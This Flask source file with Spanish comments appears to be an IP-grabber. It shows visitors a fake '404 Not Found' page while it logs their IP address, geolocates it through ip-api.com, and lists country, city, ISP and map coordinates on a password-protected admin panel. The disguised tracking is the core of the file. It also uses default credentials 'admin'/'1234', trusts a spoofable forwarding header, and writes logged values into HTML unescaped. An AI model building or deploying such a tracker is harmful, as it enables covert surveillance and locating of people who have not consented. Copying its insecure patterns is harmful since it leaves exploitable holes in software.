from flask import Flask, request, Response
from datetime import datetime
import requests
import os

app = Flask(__name__)

visitas = []

# 🔐 Credenciales (usa variables de entorno en producción)
USUARIO = os.environ.get("USER", "admin")
PASSWORD = os.environ.get("PASS", "1234")

# 🔐 Auth básica
def check_auth(username, password):
    return username == USUARIO and password == PASSWORD

def authenticate():
    return Response(
        'Acceso restringido', 401,
        {'WWW-Authenticate': 'Basic realm="Login requerido"'}
    )

def require_auth(f):
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    decorated.__name__ = f.__name__
    return decorated

# 🔹 Obtener IP real
def obtener_ip_real():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ip = ip.split(',')[0].strip()
    return ip

# 🔹 Obtener info de la IP
def obtener_info_ip(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        return {
            "pais": res.get("country", "Desconocido"),
            "ciudad": res.get("city", "Desconocido"),
            "isp": res.get("isp", "Desconocido"),
            "lat": res.get("lat", 0),
            "lon": res.get("lon", 0)
        }
    except:
        return {
            "pais": "Desconocido",
            "ciudad": "Desconocido",
            "isp": "Desconocido",
            "lat": 0,
            "lon": 0
        }

# 🔹 Página principal (404 pero guarda datos)
@app.route("/")
def inicio():
    ip = obtener_ip_real()
    tipo = "IPv6" if ":" in ip else "IPv4"
    fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    info = obtener_info_ip(ip)

    mapa = f"https://www.google.com/maps?q={info['lat']},{info['lon']}"

    visitas.append({
        "ip": ip,
        "tipo": tipo,
        "fecha": fecha,
        "pais": info["pais"],
        "ciudad": info["ciudad"],
        "isp": info["isp"],
        "lat": info["lat"],
        "lon": info["lon"],
        "mapa": mapa
    })

    return """
    <h1>404 Not Found</h1>
    <p>La página que buscas no existe.</p>
    """, 404

# 🔐 Panel protegido
@app.route("/admin")
@require_auth
def admin():
    tabla = ""

    for v in visitas:
        tabla += f"""
        <tr>
            <td>{v['ip']}</td>
            <td>{v['tipo']}</td>
            <td>{v['fecha']}</td>
            <td>{v['pais']}</td>
            <td>{v['ciudad']}</td>
            <td>{v['isp']}</td>
            <td>{v['lat']}, {v['lon']}</td>
            <td><a href="{v['mapa']}" target="_blank">🌎 Ver</a></td>
        </tr>
        """

    return f"""
    <h1>Panel Privado 🔐</h1>
    <table border="1">
        <tr>
            <th>IP</th>
            <th>Tipo</th>
            <th>Fecha</th>
            <th>País</th>
            <th>Ciudad</th>
            <th>ISP</th>
            <th>Coordenadas</th>
            <th>Mapa</th>
        </tr>
        {tabla}
    </table>
    """

# 🔥 IMPORTANTE PARA RENDER
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
